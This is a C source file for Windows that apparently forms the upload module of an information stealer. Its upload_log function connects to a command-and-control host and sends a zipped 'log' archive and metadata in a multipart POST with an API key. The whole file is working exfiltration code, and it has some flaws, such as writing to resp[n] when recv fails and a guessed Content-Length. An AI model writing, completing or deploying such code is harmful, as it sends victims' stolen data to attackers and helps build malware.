#include "panel_http.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

int upload_log(const char *c2_host, unsigned short c2_port,
               const char *token, const unsigned char *archive_data,
               size_t archive_len, const char *metadata) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return -1; }
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(c2_port);
    addr.sin_addr.s_addr = inet_addr(c2_host);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    
    // Build multipart request
    const char *boundary = "----MirageBoundary";
    char header[2048];
    int header_len = snprintf(header, sizeof(header),
        "POST /api/log HTTP/1.1\r\n"
        "Host: %s\r\n"
        "X-API-Key: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"archive\"; filename=\"log.zip\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        c2_host, token, boundary, archive_len + strlen(metadata) + 100, boundary);
    
    // Send header + archive + metadata + footer
    send(sock, header, header_len, 0);
    send(sock, (const char*)archive_data, archive_len, 0);
    
    char footer[256];
    int footer_len = snprintf(footer, sizeof(footer),
        "\r\n--%s\r\n"
        "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
        "%s\r\n"
        "--%s--\r\n",
        boundary, metadata, boundary);
    send(sock, footer, footer_len, 0);
    
    // Read response
    char resp[4096];
    int n = recv(sock, resp, sizeof(resp) - 1, 0);
    resp[n] = '\0';
    
    closesocket(sock);
    WSACleanup();
    
    // Check for HTTP 200
    if (n >= 12 && resp[9] == '2' && resp[10] == '0' && resp[11] == '0') {
        return 0;
    }
    return -1;
}
